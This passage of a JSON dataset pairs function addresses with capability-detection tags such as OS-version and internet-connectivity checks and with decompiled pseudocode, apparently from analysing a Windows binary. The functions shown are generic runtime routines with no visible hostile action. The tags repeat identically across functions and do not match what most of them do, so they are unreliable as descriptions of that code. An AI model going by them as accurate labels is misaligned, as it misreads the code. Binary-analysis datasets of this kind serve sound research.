        "decompiled_code": "\nuint fcn.004191cc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x4191e4;\n    iVar1 = fcn.00419b48();\n    uStack28 = 0x419236;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    iVar1 = *(iVar1 + 8) + -1;\n    puStack24 = &stack0xfffffffc;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.004197d8();\n            if (in_EAX == *(iVar2 + 4)) {\n                uVar3 = *(iVar2 + 8);\n                fcn.00404f60();\n                return uVar3;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41923d;\n    uStack28 = 0x419235;\n    uVar3 = fcn.00419bac();\n    return uVar3;\n}\n",
        "token_count": 300
    },
    "004192cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004192cc(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x4979c8 == 0) {\n        *0x4979c8 = fcn.00404610();\n    }\n    iVar1 = fcn.00419834();\n    if (iVar1 < 0) {\n        fcn.00419680();\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "0041930c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041930c(void)\n\n{\n    if (*0x4979c8 != 0) {\n        fcn.0041991c();\n    }\n    return;\n}\n",
        "token_count": 41
    },
    "00419324": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00419324(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    \n    iVar1 = 0;\n    if ((*0x4979c8 != 0) && (iVar3 = *(*0x4979c8 + 8) + -1,  -1 < iVar3)) {\n        do {\n            pcVar2 = fcn.004197d8();\n            iVar1 = (*pcVar2)();\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return iVar1;\n}\n",
        "token_count": 153
    },
    "00419364": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00419364(void)\n\n{\n    uint32_t uVar1;\n    \n    if (*0x4979b4 != NULL) {\n        uVar1 = (**0x4979b4)();\n        return uVar1;\n    }\n    uVar1 = fcn.00419324();\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 87
    },
    "00419494": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00419494(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    fcn.0040772c();\n    fcn.00404640();\n    iVar1 = fcn.0040772c();\n    iVar1 = *(iVar1 + 0xc);\n    uVar2 = fcn.004198c0();\n    iVar3 = fcn.0040772c();\n    *(iVar3 + 8) = uVar2;\n    fcn.004196cc();\n    if (*(iVar1 + 8) == 0) {\n        iVar1 = fcn.0040772c();\n        *(iVar1 + 0xc) = 0;\n        fcn.00404640();\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "00419598": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419598(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar *arg_8h;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    char var_ah;\n    uchar var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    puStack20 = 0x4195ae;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    (**(**0x4979b0 + 0x14))();\n    uStack24 = 0x419646;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    var_ah = *0x41965c == (*(var_4h + 0x1c) & *0x419658);\n    puStack20 = &stack0xfffffffc;\n    if (var_ah) {\n        puStack32 = 0x4195e3;\n        puStack20 = &stack0xfffffffc;\n        fcn.0041940c();\n    }\n    uStack36 = 0x419627;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.00404518();\n    var_9h = fcn.004194f0(arg_8h);\n    if (var_ah != '\\0') {\n        fcn.00419464();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41962e;\n    if (var_ah != '\\0') {\n        uStack36 = 0x419626;\n        fcn.00419494();\n    }\n    return;\n}\n",
        "token_count": 441
    },
    "00419c0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419c0c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (param_2 != *(in_EAX + 4)) {\n        if (param_2 < 0) {\n            fcn.00419be8(param_1);\n        }\n        iVar1 = param_2 + 0x1f;\n        if (iVar1 < 0) {\n            iVar1 = param_2 + 0x3e;\n        }\n        iVar1 = (iVar1 >> 5) * 4;\n        iVar2 = *(in_EAX + 4) + 0x1f;\n        if (iVar2 < 0) {\n            iVar2 = *(in_EAX + 4) + 0x3e;\n        }\n        iVar2 = (iVar2 >> 5) * 4;\n        if (iVar2 != iVar1) {\n            iVar3 = 0;\n            if (iVar1 != 0) {\n                iVar3 = fcn.00402ef0();\n                fcn.00403aac();\n            }\n            if (iVar2 != 0) {\n                if (iVar3 != 0) {\n                    fcn.00419c00();\n                    fcn.004030ec();\n                }\n                fcn.00402f0c();\n            }\n            *(in_EAX + 8) = iVar3;\n        }\n        *(in_EAX + 4) = param_2;\n    }\n    return;\n}\n",
        "token_count": 351
    },
    "00419cb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419cb0(char param_1, uint32_t param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) <= param_2) {\n        if (param_2 < 0) {\n            fcn.0040db2c();\n            fcn.00404eb4();\n            return;\n        }\n        fcn.00419c0c();\n    }\n    if (param_1 != '\\0') {\n        puVar1 = *(in_EAX + 8) + (param_2 >> 3);\n        *puVar1 = *puVar1 | '\\x01' << (param_2 & 7);\n        return;\n    }\n    puVar1 = *(in_EAX + 8) + (param_2 >> 3);\n    *puVar1 = *puVar1 & ~('\\x01' << (param_2 & 7));\n    return;\n}\n",
        "token_count": 218
    },
    "00419e70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00419ed9)\n\nvoid fcn.00419e70(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed4;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x419f05;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack288;\n    fcn.00404520();\n    fcn.004056d0();\n    iVar1 = fcn.0040483c();\n    if (iVar1 != 0) {\n        fcn.0040483c();\n        fcn.0040483c();\n    }\n    *in_FS_OFFSET = in_stack_fffffed4;\n    fcn.0040546c(0x419f0c);\n    return;\n}\n",
        "token_count": 221
    },
    "00419ffc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00419ffc(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (0 < *(in_EAX[2] + 8)) {\n        puStack16 = 0x41a018;\n        (**(*in_EAX + 0x20))();\n        uStack20 = 0x41a056;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        while (0 < *(in_EAX[2] + 8)) {\n            fcn.004198c0();\n            fcn.00404640();\n        }\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x41a05d;\n        uStack20 = 0x41a055;\n        (**(*in_EAX + 0x24))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 235
    },
    "0041a24c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041a24c(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[4] == 0) {\n        (**(*in_EAX + 0x30))();\n    }\n    in_EAX[4] = in_EAX[4] + 1;\n    return;\n}\n",
        "token_count": 74
    },
    "0041a308": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041a308(void)\n\n{\n    int32_t *in_EAX;\n    \n    in_EAX[4] = in_EAX[4] + -1;\n    if (in_EAX[4] == 0) {\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "0041abf0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041abf0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x14) != 0) {\n        (**(**(in_EAX + 0x14) + 0x10))();\n    }\n    fcn.00407110();\n    if (*(in_EAX + 0x14) != 0) {\n        (**(**(in_EAX + 0x14) + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "0041b314": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b314(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t in_EDX;\n    \n    if (*(in_EAX + 9) != '\\0') {\n        fcn.0041a400();\n    }\n    if ((in_EDX < 0) || (in_EAX[7] < in_EDX)) {\n        fcn.0041a400();\n    }\n    (**(*in_EAX + 0x88))(arg_8h);\n    return;\n}\n",
        "token_count": 118
    },
    "0041b6ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b6ec(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t *extraout_ECX;\n    \n    if (arg_ch == -1) {\n        if (0x7fffffff < arg_8h) {\ncode_r0x0041b704:\n            if (arg_ch == 0) {\n                if (arg_8h < 0x80000000) goto code_r0x0041b72e;\n            }\n            else if (arg_ch < 1) goto code_r0x0041b72e;\n        }\n    }\n    else if (-2 < arg_ch) goto code_r0x0041b704;\n    fcn.0040db2c();\n    fcn.00404eb4();\n    in_EAX = extraout_ECX;\ncode_r0x0041b72e:\n    (**(*in_EAX + 4))();\n    return;\n}\n",
        "token_count": 216
    },
    "0041b78c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b78c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t var_20h;\n    int32_t var_1ah;\n    uint *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t *var_4h;\n    \n    var_14h = &var_20h;\n    var_10h = *(*in_EAX + 0x18);\n    var_4h = in_EAX;\n    var_20h = fcn.00404518();\n    while ((var_20h != 0 && (var_20h != *0x4178e8))) {\n        var_20h = fcn.004045cc();\n    }\n    if (var_20h == 0) {\n        fcn.0041b740(&stack0xfffffffc);\n    }\n    unique0x00007a00 = *(var_20h + 0x18);\n    if (var_10h == unique0x00007a00) {\n        fcn.0041b740(&stack0xfffffffc);\n    }\n    (**(*var_4h + 0x18))(param_2, param_2 >> 0x1f);\n    return;\n}\n",
        "token_count": 289
    },
    "0041b810": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.0041b810(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == -1) {\n        if (0x7fffffff < arg_8h) {\ncode_r0x0041b82f:\n            if (arg_ch == 0) {\n                if (arg_8h < 0x80000000) goto code_r0x0041b859;\n            }\n            else if (arg_ch < 1) goto code_r0x0041b859;\n        }\n    }\n    else if (-2 < arg_ch) goto code_r0x0041b82f;\n    fcn.0040db2c();\n    fcn.00404eb4();\ncode_r0x0041b859:\n    iVar1 = (**(*in_EAX + 0x14))();\n    return iVar1;\n}\n",
        "token_count": 224
    },
    "0041b8f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b8f0(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_EDX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    int64_t iVar2;\n    uint uStackY52;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar2 = CONCAT44(arg_ch, arg_8h);\n    if ((arg_ch == 0) && (iVar2 = CONCAT44(arg_ch, arg_8h),  arg_8h == 0)) {\n        uStackY52 = 0x41b915;\n        fcn.0041b674(0, 0);\n        uStackY52 = 0x41b91b;\n        iVar2 = (***in_EDX)();\n    }\n    arg_ch = iVar2 >> 0x20;\n    arg_8h = iVar2;\n    if (arg_ch == 0) {\n        if (arg_8h < 0xf001) {\ncode_r0x0041b949:\n            var_14h = arg_8h;\n            goto code_r0x0041b94f;\n        }\n    }\n    else if (iVar2 < 0x100000000) goto code_r0x0041b949;\n    var_14h = 0xf000;\ncode_r0x0041b94f:\n    fcn.00402ef0();\n    uStackY52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    do {\n        arg_ch = iVar2 >> 0x20;\n        arg_8h = iVar2;\n        if (iVar2 == 0) {\n            *in_FS_OFFSET = uStackY52;\n            fcn.00402f0c();\n            return;\n        }\n        uVar1 = var_14h;\n        if (var_14h >> 0x1f == arg_ch) {\n            if (arg_8h <= var_14h) {\ncode_r0x0041b981:\n                uVar1 = arg_8h;\n            }\n        }\n        else if (arg_ch <= var_14h >> 0x1f) goto code_r0x0041b981;\n        fcn.0041b880();\n        fcn.0041b8b8();\n        iVar2 = iVar2 - uVar1;\n    } while( true );\n}\n",
        "token_count": 550
    },
    "0041bb4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041bb4c(uint noname_0, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffa8;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (in_DL != '\\0') {\n        puStack72 = 0x41bb6f;\n        in_EAX = fcn.00404964();\n        in_DL = extraout_DL;\n    }\n    uStack76 = 0x41bc94;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    var_1h._0_1_ = in_DL;\n    if (arg_ch == -1) {\n        in_stack_ffffffa8 = 0x80;\n        puStack72 = &fcn.0041bb4c::var_1h + 1;\n        uVar1 = fcn.004058fc(0xc0000000, 0, 0, 2, 0x80, 0);\n        sub.kernel32.dll_CreateFileA_1(uVar1);\n        fcn.0041ba44();\n        if (*(in_EAX + 4) < 0) {\n            fcn.0040a684();\n            var_14h = 0;\n            var_10h._0_1_ = 0xb;\n            sub.kernel32.dll_GetLastError_1();\n            fcn.0040d25c();\n            var_ch = 0;\n            var_8h._0_1_ = 0xb;\n            fcn.0040db68(1, &fcn.0041bb4c::var_14h);\n            fcn.00404eb4();\n        }\n    }\n    else {\n        puStack72 = &fcn.0041bb4c::var_1h + 1;\n        fcn.0040a0e4();\n        fcn.0041ba44();\n        if (*(in_EAX + 4) < 0) {\n            fcn.0040a684();\n            var_14h = 0;\n            var_10h._0_1_ = 0xb;\n            sub.kernel32.dll_GetLastError_1();\n            fcn.0040d25c();\n            var_ch = 0;\n            var_8h._0_1_ = 0xb;\n            in_stack_ffffffa8 = 1;\n            fcn.0040db68(1, &fcn.0041bb4c::var_14h);\n            fcn.00404eb4();\n        }\n    }\n    fcn.004054c0();\n    *in_FS_OFFSET = in_stack_ffffffa8;\n    uStack80 = 0x41bc9b;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 727
    },
    "0041c104": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041c104(int32_t arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_10h = 0;\n    var_4h = 0;\n    uStack28 = 0x41c196;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    if (*(arg_8h + 8) == '\\0') {\n        fcn.00405664();\n    }\n    else {\n        puStack24 = &stack0xfffffffc;\n        fcn.00409ce8();\n    }\n    var_ch = var_4h;\n    var_8h._0_1_ = 0xb;\n    arg_ch = &var_ch;\n    arg_8h_00 = 0;\n    fcn.004075f4();\n    fcn.0040daac(arg_8h_00, arg_ch);\n    fcn.00404eb4();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack32 = 0x41c19d;\n    fcn.0040546c();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 338
    },
    "0041c3fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0041c3fc(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    char *pcVar2;\n    \n    for (pcVar2 = *(in_EAX + 0x14); (*pcVar2 != '\\0' && (*pcVar2 != '.')); pcVar2 = pcVar2 + 1) {\n    }\n    cVar1 = *pcVar2;\n    if (cVar1 != '\\0') {\n        fcn.0040555c();\n        fcn.004059a4();\n    }\n    return cVar1 != '\\0';\n}\n",
        "token_count": 133
    },
    "0041c4d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c4d8(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41c581;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (param_2 != NULL) {\n        while (*param_2 != '\\0') {\n            for (; (*param_2 != '\\0' && (1 < *param_2 - 0x2dU)); param_2 = param_2 + 1) {\n            }\n            fcn.0040555c();\n            iVar2 = fcn.0041fd58();\n            if ((iVar2 == 0) && (cVar1 = fcn.004099fc(),  cVar1 != '\\0')) {\n                iVar2 = in_EAX;\n            }\n            if (iVar2 == 0) break;\n            if (*param_2 == '.') {\n                param_2 = param_2 + 1;\n            }\n            if (*param_2 == '-') {\n                param_2 = param_2 + 1;\n            }\n            in_EAX = iVar2;\n            if (*param_2 == '>') {\n                param_2 = param_2 + 1;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41c588;\n    uStack36 = 0x41c580;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 402
    },
    "0041c624": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041c624(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = 0x41c637;\n    (**(**0x4979b0 + 0x14))();\n    uStack40 = 0x41c7e0;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x41c64f;\n    puStack36 = &stack0xfffffffc;\n    iVar1 = fcn.00419b48();\n    uStack52 = 0x41c7c1;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    if (*(iVar1 + 8) < 1) {\n        *in_FS_OFFSET = uStack56;\n        puStack48 = 0x41c7c8;\n        uStack52 = 0x41c7c0;\n        fcn.00419bac();\n        return;\n    }\n    puStack60 = 0x41c675;\n    puStack48 = &stack0xfffffffc;\n    fcn.00404610();\n    uStack64 = 0x41c7a2;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x41c692;\n    puStack60 = &stack0xfffffffc;\n    fcn.00404610();\n    uStack76 = 0x41c750;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    iVar5 = 0;\n    puStack72 = &stack0xfffffffc;\ncode_r0x0041c731:\n    while( true ) {\n        if (*(iVar1 + 8) <= iVar5) {\n            *in_FS_OFFSET = uStack80;\n            puStack72 = 0x41c757;\n            uStack76 = 0x41c74f;\n            fcn.00404640();\n            return;\n        }\n        puVar2 = fcn.004197d8();\n        iVar3 = fcn.00419324();\n        if (iVar3 != 0) break;\n        iVar4 = fcn.004165b0();\n        if (iVar4 != 0) break;\n        fcn.0041c5dc(&stack0xfffffffc);\n        iVar5 = iVar5 + 1;\n    }\n    if (iVar3 != 0) {\n        if ((*(iVar3 + 0x1c) & 2) != 0) {\n            fcn.0041c5dc(&stack0xfffffffc);\n            iVar5 = iVar5 + 1;\n            goto code_r0x0041c731;\n        }\n        fcn.0041c4d8();\n        (***puVar2)();\n    }\n    fcn.0041c5a4(&stack0xfffffffc);\n    fcn.004196cc();\n    fcn.00404640();\n    goto code_r0x0041c731;\n}\n",
        "token_count": 807
    },
    "0041c7f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c7f0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x4979cc == 0) {\n        return;\n    }\n    puStack28 = 0x41c816;\n    iVar2 = fcn.00419b48();\n    uStack32 = 0x41c88b;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = *(iVar2 + 8) + -1;\n    puStack28 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            iVar3 = fcn.004197d8();\n            if ((in_EAX == 0) || (*(iVar3 + 8) == in_EAX)) {\n                if (param_2 != 0) {\n                    cVar1 = fcn.004099fc();\n                    if (cVar1 == '\\0') goto code_r0x0041c86d;\n                }\n                fcn.004196cc();\n                fcn.00404640();\n            }\ncode_r0x0041c86d:\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41c892;\n    uStack32 = 0x41c88a;\n    fcn.00419bac();\n    return;\n}\n",
        "token_count": 389
    },
    "0041c89c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
